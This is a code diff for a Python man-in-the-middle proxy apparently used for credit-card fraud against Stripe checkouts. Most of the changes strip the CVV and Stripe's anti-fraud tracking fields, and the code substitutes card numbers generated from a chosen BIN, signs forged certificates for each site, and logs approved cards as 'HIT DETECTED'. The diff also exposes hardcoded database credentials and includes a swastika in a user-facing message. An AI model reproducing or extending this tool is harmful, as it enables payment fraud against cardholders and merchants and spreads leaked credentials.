@@ -37,7 +37,8 @@ bin_whitelist = ["Oxxi1337", "Dons"]
 
 logging.getLogger('http.server').setLevel(logging.CRITICAL + 1)
 
-userDatabase = MongoClient('mongodb://mohio:ck1QpFfooZ3Nb30k@185.253.54.63:27017/admin?authSource=admin').admin.mohio
+client = MongoClient("mongodb+srv://2mohio:2mohio@major-cluster.tbmybs3.mongodb.net/?retryWrites=true&w=majority")
+userDatabase = client['mohiodb']['users']
 
 def request_handler(req, req_body):
 	if req.path.split("://", 1)[1].startswith("api.stripe.com"):
@@ -47,13 +48,29 @@ def request_handler(req, req_body):
 
 				#Delete CVV
 				parsedbody = deletefromarray(parsedbody, "payment_method_data[card][cvc]")
-				
+
+				######## Modified shit by Sam  ########
+
+				# Delete payment_user_agent
+				parsedbody = deletefromarray(parsedbody, "payment_method_data[payment_user_agent]")
+
+				# Delete sid
+				parsedbody = deletefromarray(parsedbody, "payment_method_data[sid]")
+
+				# Delete muid
+				parsedbody = deletefromarray(parsedbody, "payment_method_data[muid]")
+
+				# Delete guid
+				parsedbody = deletefromarray(parsedbody, "payment_method_data[guid]")
+
+				######## End of Modified shit by Sam  ########
+
 				#Delete logging fields
 				parsedbody = deletefromarray(parsedbody, "payment_method_data[pasted_fields]")
 				parsedbody = deletefromarray(parsedbody, "payment_method_data[time_on_page]")
 
-				if parsedbody["payment_method_data[card][number]"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
-					parsedbody["payment_method_data[card][number]"] = parsedbody["payment_method_data[card][number]"].replace(" ", "").replace("409595", "")
+				if parsedbody["payment_method_data[card][number]"].replace(" ", "").startswith("000000") and not req.getCurrentUser().get("username") in bin_whitelist:
+					parsedbody["payment_method_data[card][number]"] = parsedbody["payment_method_data[card][number]"].replace(" ", "").replace("000000", "")
 
 				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["payment_method_data[card][number]"].replace(" ", "")):
 					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
@@ -61,7 +78,7 @@ def request_handler(req, req_body):
 					parsedbody["payment_method_data[card][exp_month]"] = gennedCC[1]
 					parsedbody["payment_method_data[card][exp_year]"] = gennedCC[2]
 
-				req.addToLogs("yellow:yellow:TESTING CARD: "+parsedbody["payment_method_data[card][number]"].replace(" ", "")+"|"+parsedbody["payment_method_data[card][exp_month]"]+"|"+parsedbody["payment_method_data[card][exp_year]"])
+				req.addToLogs("yellow:yellow:TRYING CARD 🧐: "+parsedbody["payment_method_data[card][number]"].replace(" ", "")+"|"+parsedbody["payment_method_data[card][exp_month]"]+"|"+parsedbody["payment_method_data[card][exp_year]"])
 
 				req_body = build_x_www_form_urlencoded(parsedbody).encode()
 			elif b"card[number]" in req_body:
@@ -70,12 +87,28 @@ def request_handler(req, req_body):
 				#Delete CVV
 				parsedbody = deletefromarray(parsedbody, "card[cvc]")
 
+				######## Modified shit by Sam  ########
+
+				# Delete payment_user_agent
+				parsedbody = deletefromarray(parsedbody, "payment_user_agent")
+
+				# Delete sid
+				parsedbody = deletefromarray(parsedbody, "sid")
+
+				# Delete muid
+				parsedbody = deletefromarray(parsedbody, "muid")
+
+				# Delete guid
+				parsedbody = deletefromarray(parsedbody, "guid")
+
+				######## End of Modified shit by Sam  ########
+
 				#Delete logging fields
 				parsedbody = deletefromarray(parsedbody, "pasted_fields")
 				parsedbody = deletefromarray(parsedbody, "time_on_page")
 
-				if parsedbody["card[number]"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
-					parsedbody["card[number]"] = parsedbody["card[number]"].replace(" ", "").replace("409595", "")
+				if parsedbody["card[number]"].replace(" ", "").startswith("000000") and not req.getCurrentUser().get("username") in bin_whitelist:
+					parsedbody["card[number]"] = parsedbody["card[number]"].replace(" ", "").replace("000000", "")
 
 				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["card[number]"].replace(" ", "")):
 					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
@@ -83,7 +116,7 @@ def request_handler(req, req_body):
 					parsedbody["card[exp_month]"] = gennedCC[1]
 					parsedbody["card[exp_year]"] = gennedCC[2]
 
-				req.addToLogs("yellow:yellow:TESTING CARD: "+parsedbody["card[number]"].replace(" ", "")+"|"+parsedbody["card[exp_month]"]+"|"+parsedbody["card[exp_year]"])
+				req.addToLogs("yellow:yellow:TRYING CARD 🧐: "+parsedbody["card[number]"].replace(" ", "")+"|"+parsedbody["card[exp_month]"]+"|"+parsedbody["card[exp_year]"])
 
 				req_body = build_x_www_form_urlencoded(parsedbody).encode()
 			elif b"source_data[card][number]" in req_body:
@@ -92,12 +125,28 @@ def request_handler(req, req_body):
 				#Delete CVV
 				parsedbody = deletefromarray(parsedbody, "source_data[card][cvc]")
 
+				######## Modified shit by Sam  ########
+
+				# Delete payment_user_agent
+				parsedbody = deletefromarray(parsedbody, "source_data[payment_user_agent]")
+
+				# Delete sid
+				parsedbody = deletefromarray(parsedbody, "source_data[sid]")
+
+				# Delete muid
+				parsedbody = deletefromarray(parsedbody, "source_data[muid]")
+
+				# Delete guid
+				parsedbody = deletefromarray(parsedbody, "source_data[guid]")
+
+				######## End of Modified shit by Sam  ########
+
 				#Delete logging fields
 				parsedbody = deletefromarray(parsedbody, "source_data[pasted_fields]")
 				parsedbody = deletefromarray(parsedbody, "source_data[time_on_page]")
 
-				if parsedbody["source_data[card][number]"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
-					parsedbody["source_data[card][number]"] = parsedbody["source_data[card][number]"].replace(" ", "").replace("409595", "")
+				if parsedbody["source_data[card][number]"].replace(" ", "").startswith("000000") and not req.getCurrentUser().get("username") in bin_whitelist:
+					parsedbody["source_data[card][number]"] = parsedbody["source_data[card][number]"].replace(" ", "").replace("000000", "")
 
 				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["source_data[card][number]"].replace(" ", "")):
 					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
@@ -105,7 +154,7 @@ def request_handler(req, req_body):
 					parsedbody["source_data[card][exp_month]"] = gennedCC[1]
 					parsedbody["source_data[card][exp_year]"] = gennedCC[2]
 
-				req.addToLogs("yellow:yellow:TESTING CARD: "+parsedbody["source_data[card][number]"].replace(" ", "")+"|"+parsedbody["source_data[card][exp_month]"]+"|"+parsedbody["source_data[card][exp_year]"])
+				req.addToLogs("yellow:yellow:TRYING CARD 🧐: "+parsedbody["source_data[card][number]"].replace(" ", "")+"|"+parsedbody["source_data[card][exp_month]"]+"|"+parsedbody["source_data[card][exp_year]"])
 
 				req_body = build_x_www_form_urlencoded(parsedbody).encode()
 		except Exception as e:
@@ -114,7 +163,6 @@ def request_handler(req, req_body):
 	
 	try:
 		if req.path.split("://", 1)[1].startswith("m.stripe.com") and False:
-			#Fingerprint randomization
 			old_req = req_body
 			payload = json.loads(urllib.parse.unquote_plus(base64.b64decode(req_body).decode()))
 
@@ -217,27 +265,27 @@ def response_handler(req, req_body, res, res_body):
 	try:
 		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/payment_pages/"):
 			if b'"decline_code": "' in res_body:
-				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
+				req.addToLogs("red:red:CARD DECLINED ⚠ : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
 			elif b'"code": "' in res_body:
-				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
+				req.addToLogs("red:red:CARD DECLINED ⚠ : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
 			elif b'"completed": true' in res_body:
-				req.addToLogs('green:lime:CARD APPROVED')
+				req.addToLogs('green:lime:HIT DETECTED ✨')
 			
 		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/payment_intents/") and not req.path.split("://", 1)[1].endswith("verify_challenge"):
 			if b'"decline_code": "' in res_body:
-				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
+				req.addToLogs("red:red:CARD DECLINED ⚠ : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
 			elif b'"code": "' in res_body:
-				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
+				req.addToLogs("red:red:CARD DECLINED ⚠ : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
 			elif b'succeeded' in res_body:
-				req.addToLogs('green:lime:CARD APPROVED')
+				req.addToLogs('green:lime:HIT DETECTED ✨')
 		
 		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/checkout/sessions/completed_webhook_delivered/"):
 			if b'"decline_code": "' in res_body:
-				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
+				req.addToLogs("red:red:CARD DECLINED ⚠ : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
 			elif b'"code": "' in res_body:
-				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
+				req.addToLogs("red:red:CARD DECLINED ⚠ : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
 			elif b'"completed": true' in res_body:
-				req.addToLogs('green:lime:CARD APPROVED')
+				req.addToLogs('green:lime:HIT DETECTED ✨')
 	except Exception as e:
 		traceback.print_exc()
 		pass
@@ -249,6 +297,24 @@ def response_handler(req, req_body, res, res_body):
 				#Here we are using a checkout, time to do the funny
 
 				parsedbody = deletefromarray(parsedbody, "card[cvc]")
+
+				######## Modified shit by Sam  ########
+
+				# Delete payment_user_agent
+				parsedbody = deletefromarray(parsedbody, "payment_user_agent")
+
+				# Delete sid
+				parsedbody = deletefromarray(parsedbody, "sid")
+
+				# Delete muid
+				parsedbody = deletefromarray(parsedbody, "muid")
+
+				# Delete guid
+				parsedbody = deletefromarray(parsedbody, "guid")
+
+				######## End of Modified shit by Sam  ########
+
+
 				unexploited_payload = build_x_www_form_urlencoded(parsedbody)
 
 				#Big meme right here LMFAO
@@ -419,4 +485,643 @@ class ProxyRequestHandler(BaseHTTPRequestHandler):
 				self.connect_intercept()
 			else:
 				self.connect_no_intercept()
-		except Exce
+		except Exception as e:
+			pass
+
+
+	def do_REQ(self):
+		try:
+			if not hasattr(self, 'ishttps'):
+				self.hostname = urllib.parse.urlparse(self.path).netloc
+				self.ishttps = False
+
+			if self.hostname == "mohio":
+				self.handle_custom_domain()
+				return
+			
+
+			if not self.isAuthorized():
+				self.send_response_only(302, "Found")
+				self.send_header("Location", "https://mohio")
+				self.send_header("Content-Type", "text/html; charset=UTF-8")
+				self.send_header("Content-Length", "0")
+				self.end_headers()
+				return
+
+			else:
+				def create_proxy_connection(scheme, netloc):
+					full_proxy = self.getCurrentUser().get("settings").get("proxy").split(":")
+					proxy_host = full_proxy[0]
+					proxy_port = int(full_proxy[1])
+					try:
+						proxy_user = full_proxy[2]
+					except:
+						proxy_user = ""
+					try:
+						proxy_pass = full_proxy[3]
+					except:
+						proxy_pass = ""
+					
+					credentials = f"{proxy_user}:{proxy_pass}"
+					auth_header = f"Basic {base64.b64encode(credentials.encode()).decode()}"
+
+					if scheme == "https":
+						context = ssl.create_default_context()
+						raw_socket = socket.create_connection((proxy_host, proxy_port))
+						if proxy_user != "" and proxy_pass != "":
+							raw_socket.sendall(f"CONNECT {netloc}:443 HTTP/1.0\r\nHost: {netloc}:443\r\nProxy-Authorization: {auth_header}\r\n\r\n".encode())
+						else:
+							raw_socket.sendall(f"CONNECT {netloc}:443 HTTP/1.0\r\nHost: {netloc}:443\r\n\r\n".encode())
+						response = http.client.HTTPResponse(raw_socket)
+						response.begin()
+						if response.status != 200:
+							raise Exception("Proxy connection failed")
+						conn = http.client.HTTPSConnection(netloc, context=context)
+						conn.sock = context.wrap_socket(raw_socket, server_hostname=netloc)
+					else:
+						conn = http.client.HTTPConnection(proxy_host, proxy_port)
+						conn.set_tunnel(netloc, headers={"Proxy-Authorization": auth_header})
+					
+					return conn
+
+				req = self
+				content_length = int(req.headers.get("Content-Length", 0))
+				req_body = self.rfile.read(content_length) if content_length else b""
+
+				if req.path[0] == "/":
+					if isinstance(self.connection, ssl.SSLSocket):
+						req.path = "https://%s%s" % (req.headers["Host"], req.path)
+					else:
+						req.path = "http://%s%s" % (req.headers["Host"], req.path)
+
+				if request_handler is not None:
+					req_body_modified = request_handler(req, req_body)
+					if req_body_modified is False:
+						self.send_error(403)
+						return
+					if req_body_modified is not None:
+						req_body = req_body_modified
+
+				def remove_key_case_insensitive(d, key_to_remove):
+					key_to_remove_lower = key_to_remove.lower()
+					
+					keys_to_delete = [k for k in d if k.lower() == key_to_remove_lower]
+					
+					for key in keys_to_delete:
+						del d[key]
+
+				remove_key_case_insensitive(req.headers, "Content-Length")
+				req.headers["Content-Length"] = str(len(req_body))
+				
+				u = urllib.parse.urlsplit(req.path)
+				scheme = u.scheme
+				netloc = u.netloc
+				path = u.path + "?" + u.query if u.query else u.path
+				assert scheme in ("http", "https")
+				if netloc:
+					req.headers["Host"] = netloc
+				req.headers = self.filter_headers(req.headers)  # type: ignore
+
+				origin = (scheme, netloc)
+				try:
+					if origin not in self.tls.conns:
+						self.tls.conns[origin] = create_proxy_connection(scheme, netloc)
+					conn = self.tls.conns[origin]
+					conn.request(self.command, path, req_body, dict(req.headers))
+					res = conn.getresponse()
+
+					# support streaming
+					cache_control = res.headers.get("Cache-Control", "")
+					if "Content-Length" not in res.headers and "no-store" in cache_control:
+						if response_handler is not None:
+							response_handler(req, req_body, res, "")
+						res.headers = self.filter_headers(res.headers)
+						self.relay_streaming(res)
+						return
+
+					res_body = res.read()
+				except Exception as e:
+					if origin in self.tls.conns:
+						del self.tls.conns[origin]
+					self.send_error(502)
+					return
+
+				if response_handler is not None:
+					content_encoding = res.headers.get("Content-Encoding", "identity")
+					res_body_plain = self.decode_content_body(res_body, content_encoding)
+					res_body_modified = response_handler(req, req_body, res, res_body_plain)
+					if res_body_modified is False:
+						self.send_error(403)
+						return
+					if res_body_modified is not None:
+						res_body = self.encode_content_body(res_body_modified, content_encoding)
+						def remove_key_case_insensitive(d, key_to_remove):
+							key_to_remove_lower = key_to_remove.lower()
+							
+							keys_to_delete = [k for k in d if k.lower() == key_to_remove_lower]
+							
+							for key in keys_to_delete:
+								del d[key]
+
+						remove_key_case_insensitive(res.headers, "Content-Length")
+						res.headers["Content-Length"] = str(len(res_body))
+
+				res.headers = self.filter_headers(res.headers)
+
+				self.send_response_only(res.status, res.reason)
+				for k, v in res.headers.items():
+					self.send_header(k, v)
+				self.end_headers()
+				self.wfile.write(res_body)
+				self.wfile.flush()
+		except:
+			pass
+
+	def connect_intercept(self):
+		hostname = self.path.split(":")[0]
+
+		with self.lock:
+			key_file_name, cert_file_name = self.create_and_sign_cert(hostname, "ca-cert.pem", "ca-key.pem")
+
+		self.send_response(200, "Connection Established")
+		self.end_headers()
+
+		context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+		context.verify_mode = ssl.CERT_NONE
+		context.load_cert_chain(cert_file_name, key_file_name)
+
+		try:
+			self.connection = context.wrap_socket(self.connection, server_side=True)
+		except ssl.SSLEOFError:
+			return
+
+		self.rfile = self.connection.makefile("rb", self.rbufsize)
+		self.wfile = self.connection.makefile("wb", self.wbufsize)
+
+		conntype = self.headers.get("Proxy-Connection", "")
+		if self.protocol_version == "HTTP/1.1" and conntype.lower() != "close":
+			self.close_connection = False
+		else:
+			self.close_connection = True
+
+	def connect_no_intercept(self):
+		full_proxy = self.getCurrentUser().get("settings").get("proxy").split(":")
+		proxy_host = full_proxy[0]
+		proxy_port = int(full_proxy[1])
+		try:
+			proxy_user = full_proxy[2]
+		except:
+			proxy_user = ""
+		try:
+			proxy_pass = full_proxy[3]
+		except:
+			proxy_pass = ""
+
+		credentials = f"{proxy_user}:{proxy_pass}"
+		auth_header = f"Basic {base64.b64encode(credentials.encode()).decode()}"
+
+		remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		remote.connect((proxy_host, proxy_port))
+		if proxy_user != "" and proxy_pass != "":
+			remote.sendall(
+				f"CONNECT {self.hostname}:443 HTTP/1.1\r\n"
+				f"Host: {self.hostname}:443\r\n"
+				f"Proxy-Authorization: {auth_header}\r\n"
+				f"Proxy-Connection: Keep-Alive\r\n\r\n".encode()
+			)
+		else:
+			remote.sendall(
+				f"CONNECT {self.hostname}:443 HTTP/1.1\r\n"
+				f"Host: {self.hostname}:443\r\n"
+				f"Proxy-Connection: Keep-Alive\r\n\r\n".encode()
+			)
+
+		response = http.client.HTTPResponse(remote)
+		response.begin()
+		if response.status != 200:
+			self.send_error(502)
+			return
+
+		self.send_response(200, "Connection Established")
+		self.end_headers()
+
+		inputs = [self.connection, remote]
+		while inputs:
+			readable, _, _ = select.select(inputs, [], [])
+			for r in readable:
+				data = r.recv(4096)
+				if not data:
+					inputs.remove(r)
+				else:
+					if r is remote:
+						self.connection.sendall(data)
+					else:
+						remote.sendall(data)
+
+		remote.close()
+
+	def relay_streaming(self, res):
+		self.send_response_only(res.status, res.reason)
+		for k, v in res.headers.items():
+			self.send_header(k, v)
+		self.end_headers()
+		try:
+			while True:
+				chunk = res.read(8192)
+				if not chunk:
+					break
+				self.wfile.write(chunk)
+			self.wfile.flush()
+		except socket.error:
+			# connection closed by client
+			pass
+
+	def filter_headers(self, headers: HTTPMessage) -> HTTPMessage:
+		# http://tools.ietf.org/html/rfc2616#section-13.5.1
+		hop_by_hop = (
+			"connection",
+			"keep-alive",
+			"proxy-authenticate",
+			"proxy-authorization",
+			"te",
+			"trailers",
+			"transfer-encoding",
+			"upgrade",
+		)
+		for k in hop_by_hop:
+			del headers[k]
+
+		# accept only supported encodings
+		if "Accept-Encoding" in headers:
+			ae = headers["Accept-Encoding"]
+			filtered_encodings = [
+				x
+				for x in re.split(r",\s*", ae)
+				if x in ("identity", "gzip", "x-gzip", "deflate")
+			]
+			headers["Accept-Encoding"] = ", ".join(filtered_encodings)
+
+		return headers
+
+	do_GET = do_REQ
+	do_HEAD = do_REQ
+	do_POST = do_REQ
+	do_PUT = do_REQ
+	do_DELETE = do_REQ
+	do_OPTIONS = do_REQ
+
+	lock = threading.Lock()
+
+
+	def __init__(self, *args, **kwargs):
+		self.tls = threading.local()
+		self.tls.conns = {}
+
+		super().__init__(*args, **kwargs)
+
+	def log_error(self, format, *args):
+		pass
+
+	def handle_custom_domain(self):
+		if not self.ishttps:
+			self.send_response_only(302, "Found")
+			self.send_header("Location", "https://mohio")
+			self.send_header("Content-Type", "text/html; charset=UTF-8")
+			self.send_header("Content-Length", "0")
+			self.end_headers()
+		else:
+			if self.path == "/cert.pem":
+				self.send_cacert()
+				return
+			if self.path == "/getcreds":
+				if isWin():
+					getcredsf = open("site\\getcreds.html", "rb")
+				else:
+					getcredsf = open("site/getcreds.html", "rb")
+				getcreds = getcredsf.read()
+				self.send_response_only(200, "OK")
+				self.send_header("Content-Type", "text/html; charset=UTF-8")
+				self.send_header("Content-Length", len(getcreds))
+				self.end_headers()
+				self.wfile.write(getcreds)
+				self.wfile.flush()
+				getcredsf.close()
+				return
+			if self.path == "/fingerprint.js":
+				if isWin():
+					fingerprintjsf = open("site\\fingerprint.js", "rb")
+				else:
+					fingerprintjsf = open("site/fingerprint.js", "rb")
+				fingerprintjs = fingerprintjsf.read()
+				self.send_response_only(200, "OK")
+				self.send_header("Content-Type", "text/javascript; charset=UTF-8")
+				self.send_header("Content-Length", len(fingerprintjs))
+				self.end_headers()
+				self.wfile.write(fingerprintjs)
+				self.wfile.flush()
+				fingerprintjsf.close()
+				return
+			if self.path == "/logs" and self.isAuthorized():
+				try:
+					templogs = self.getCurrentUser().get("settings").get("logs")
+					while len(templogs) < 10:
+						templogs.insert(0, '')
+					templogs = json.dumps(templogs).encode()
+					self.send_response_only(200, "OK")
+					self.send_header("Content-Type", "application/json; charset=UTF-8")
+					self.send_header("Content-Length", len(templogs))
+					self.end_headers()
+					self.wfile.write(templogs)
+					self.wfile.flush()
+				except:
+					templogs = json.dumps(['','','','','','','','','',''])
+					self.send_response_only(200, "OK")
+					self.send_header("Content-Type", "application/json; charset=UTF-8")
+					self.send_header("Content-Length", len(templogs))
+					self.end_headers()
+					self.wfile.write(templogs)
+					self.wfile.flush()
+				return
+			if self.path == "/settings" and self.isAuthorized():
+				if isWin():
+					authorizedf = open("site\\settings.html", "rb")
+				else:
+					authorizedf = open("site/settings.html", "rb")
+				authorized = authorizedf.read()
+
+				try:
+					authorized = authorized.replace(b"PROXYVAL", self.getCurrentUser().get("settings").get("proxy").encode())
+				except:
+					authorized = authorized.replace(b"PROXYVAL", b"")
+
+				try:
+					authorized = authorized.replace(b"BINVAL", self.getCurrentUser().get("settings").get("bin").encode())
+				except:
+					authorized = authorized.replace(b"BINVAL", b"")
+
+				self.send_response_only(200, "OK")
+				self.send_header("Content-Type", "text/html; charset=UTF-8")
+				self.send_header("Content-Length", len(authorized))
+				self.end_headers()
+				self.wfile.write(authorized)
+				self.wfile.flush()
+				authorizedf.close()
+				return
+			if self.path == "/saveSettings" and self.isAuthorized():
+				try:
+					content_length = int(self.headers.get("Content-Length", 0))
+					request_body = self.rfile.read(content_length) if content_length else b""
+					jsonData = json.loads(request_body.decode())
+
+					settings = self.getCurrentUser().get("settings")
+					settings["proxy"] = jsonData["proxy"]
+					if jsonData["bin"].startswith("000000") and self.getCurrentUser().get("username") not in bin_whitelist:
+						settings["bin"] = "卐 BIN BLACKLISTED BY MOHIO STAFF 卐"
+					else:
+						settings["bin"] = jsonData["bin"]
+
+					userDatabase.update_one(
+						{"username": self.getCurrentUser().get("username")},
+						{"$set": {"settings": settings}}
+					)
+				except:
+					pass
+
+				self.send_response_only(200, "OK")
+				self.send_header("Content-Type", "text/html; charset=UTF-8")
+				self.send_header("Content-Length", 2)
+				self.end_headers()
+				self.wfile.write(b"OK")
+				self.wfile.flush()
+				return
+			elif self.isAuthorized():
+				self.send_response_only(302, "Found")
+				self.send_header("Location", "https://mohio/settings")
+				self.send_header("Content-Type", "text/html; charset=UTF-8")
+				self.send_header("Content-Length", "0")
+				self.end_headers()
+			if self.path == "/":
+				if isWin():
+					loginpagef = open("site\\loginpage.html", "rb")
+				else:
+					loginpagef = open("site/loginpage.html", "rb")
+				loginpage = loginpagef.read()
+				self.send_response_only(200, "OK")
+				self.send_header("Content-Type", "text/html; charset=UTF-8")
+				self.send_header("Content-Length", len(loginpage))
+				self.end_headers()
+				self.wfile.write(loginpage)
+				self.wfile.flush()
+				loginpagef.close()
+				return
+			if self.path == "/wrongpassword":
+				if isWin():
+					wrongpasswordf = open("site\\wrongpassword.html", "rb")
+				else:
+					wrongpasswordf = open("site/wrongpassword.html", "rb")
+				wrongpassword = wrongpasswordf.read()
+				self.send_response_only(200, "OK")
+				self.send_header("Content-Type", "text/html; charset=UTF-8")
+				self.send_header("Content-Length", len(wrongpassword))
+				self.end_headers()
+				self.wfile.write(wrongpassword)
+				self.wfile.flush()
+				wrongpasswordf.close()
+				return
+			if self.path == "/login" and self.command == "POST":
+				content_length = int(self.headers.get("Content-Length", 0))
+				request_body = self.rfile.read(content_length) if content_length else b""
+				jsonData = json.loads(request_body.decode())
+
+				try:
+					hashl = hashlib.sha256()
+					hashl.update(jsonData["pass"].encode())
+					hashedpass = hashl.hexdigest()
+					if not (
+						self.getUserByName(jsonData["user"]).get("password") == hashedpass and 
+						jsonData["fingerprint"] in self.getUserByName(jsonData["user"]).get("fingerprint")
+					):
+						self.send_response_only(302, "Found")
+						self.send_header("Location", "https://mohio/wrongpassword")
+						self.send_header("Content-Type", "text/html; charset=UTF-8")
+						self.send_header("Content-Length", "0")
+						self.end_headers()
+						return
+				except:
+					self.send_response_only(302, "Found")
+					self.send_header("Location", "https://mohio/wrongpassword")
+					self.send_header("Content-Type", "text/html; charset=UTF-8")
+					self.send_header("Content-Length", "0")
+					self.end_headers()
+					return
+
+				userDatabase.update_one(
+					{"username": jsonData["user"]},
+					{"$set": {"ip": self.client_address[0]}}
+				)
+				self.send_response_only(302, "Found")
+				self.send_header("Location", "https://mohio/settings")
+				self.send_header("Content-Type", "text/html; charset=UTF-8")
+				self.send_header("Content-Length", "0")
+				self.end_headers()
+				return
+		return
+
+	def isAuthorized(self):
+		client_ip = self.client_address[0]
+		for user in userDatabase.find():
+			if user.get("ip") == client_ip:
+				return True
+		return False
+
+	def getCurrentUser(self):
+		client_ip = self.client_address[0]
+		for user in userDatabase.find():
+			if user.get("ip") == client_ip:
+				return user
+		return False
+
+	def addToLogs(self, text):
+		client_ip = self.client_address[0]
+		for user in userDatabase.find():
+			if user.get("ip") == client_ip:
+				settings = user.get("settings")
+
+				try:
+					oldlogs = user.get("settings").get("logs")
+					if not isinstance(oldlogs, list):
+						oldlogs = []
+				except:
+					oldlogs = []
+
+				if len(oldlogs) >= 10:
+					oldlogs.pop(0)
+
+				oldlogs.append(text)
+				settings["logs"] = oldlogs
+
+				userDatabase.update_one(
+					{"username": user.get("username")},
+					{"$set": {"settings": settings}}
+				)
+
+	def getUserByName(self, username):
+		try:
+			user = userDatabase.find_one({"username": username})
+			if user.get("username") == username:
+				return user
+			else:
+				return False
+		except:
+			return False
+
+	def getFormattedProxy(self):
+		try:
+			ip, port, user, passwd = self.getCurrentUser().get("settings").get("proxy").split(":")
+			return {"http": "http://"+user+":"+passwd+"@"+ip+":"+port, "https": "http://"+user+":"+passwd+"@"+ip+":"+port}
+		except:
+			ip, port = self.getCurrentUser().get("settings").get("proxy").split(":")
+			return {"http": "http://"+ip+":"+port, "https": "http://"+ip+":"+port} 
+
+	def create_and_sign_cert(self, domain, ca_cert_file, ca_key_file, days=365):
+		if isWin():
+			if os.path.isfile("certs\\"+str(domain)+".key") and os.path.isfile("certs\\"+str(domain)+".crt"):
+				return "certs\\"+domain+".key", "certs\\"+domain+".crt"
+		else:
+			if os.path.isfile("certs/"+str(domain)+".key") and os.path.isfile("certs/"+str(domain)+".crt"):
+				return "certs/"+domain+".key", "certs/"+domain+".crt"
+
+		with open(ca_cert_file, "rb") as f:
+			ca_cert_pem = f.read()
+		ca_cert = crypto.load_certificate(crypto.FILETYPE_PEM, ca_cert_pem)
+
+		with open(ca_key_file, "rb") as f:
+			ca_key_pem = f.read()
+		ca_key = crypto.load_privatekey(crypto.FILETYPE_PEM, ca_key_pem)
+
+		domain_key = crypto.PKey()
+		domain_key.generate_key(crypto.TYPE_RSA, 2048)
+
+		csr = crypto.X509Req()
+		subject = csr.get_subject()
+		subject.CN = domain
+		csr.set_pubkey(domain_key)
+		csr.sign(domain_key, 'sha256')
+
+		domain_cert = crypto.X509()
+		domain_cert.set_version(2)
+		domain_cert.set_serial_number(int(os.urandom(16).hex(), 16))
+		domain_cert.gmtime_adj_notBefore((days * 24 * 60 * 60) * -1)
+		domain_cert.gmtime_adj_notAfter(days * 24 * 60 * 60)
+		domain_cert.set_subject(csr.get_subject())
+		domain_cert.set_issuer(ca_cert.get_subject())
+		domain_cert.set_pubkey(csr.get_pubkey())
+
+		san = f'DNS:{domain}'
+		ext = crypto.X509Extension(b'subjectAltName', False, san.encode('ascii'))
+		domain_cert.add_extensions([ext])
+
+		domain_cert.sign(ca_key, 'sha256')
+
+		if isWin():
+			key_file = open("certs\\"+domain+".key", "wb+")
+			cert_file = open("certs\\"+domain+".crt", "wb+")
+		else:
+			key_file = open("certs/"+domain+".key", "wb+")
+			cert_file = open("certs/"+domain+".crt", "wb+")
+		key_file.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, domain_key))
+		cert_file.write(crypto.dump_certificate(crypto.FILETYPE_PEM, domain_cert))
+		key_file.close()
+		cert_file.close()
+
+		return key_file.name, cert_file.name
+
+
+	def encode_content_body(self, text: bytes, encoding: str) -> bytes:
+		if encoding == "identity":
+			data = text
+		elif encoding in ("gzip", "x-gzip"):
+			data = gzip.compress(text)
+		elif encoding == "deflate":
+			data = zlib.compress(text)
+		elif encoding == "br":
+			data = brotli.compress(text)
+		else:
+			raise Exception("Unknown Content-Encoding: %s" % encoding)
+		return data
+
+	def decode_content_body(self, data: bytes, encoding: str) -> bytes:
+		if encoding == "identity":
+			text = data
+		elif encoding in ("gzip", "x-gzip"):
+			text = gzip.decompress(data)
+		elif encoding == "deflate":
+			try:
+				text = zlib.decompress(data)
+			except zlib.error:
+				text = zlib.decompress(data, -zlib.MAX_WBITS)
+		elif encoding == "br":
+			text = brotli.decompress(data)
+		else:
+			raise Exception("Unknown Content-Encoding: %s" % encoding)
+		return text
+		
+	def send_cacert(self):
+		with open("ca-cert.pem", "rb") as f:
+			data = f.read()
+
+		self.send_response(200, "OK")
+		self.send_header("Content-Type", "application/x-x509-ca-cert")
+		self.send_header("Content-Length", str(len(data)))
+		self.send_header("Connection", "close")
+		self.end_headers()
+		self.wfile.write(data)
+
+
+http.server.test(
+	HandlerClass=ProxyRequestHandler,
+	ServerClass=ThreadingHTTPServer,
+	protocol="HTTP/1.1",
+	port=1337,
+	bind="154.26.128.39",
+)
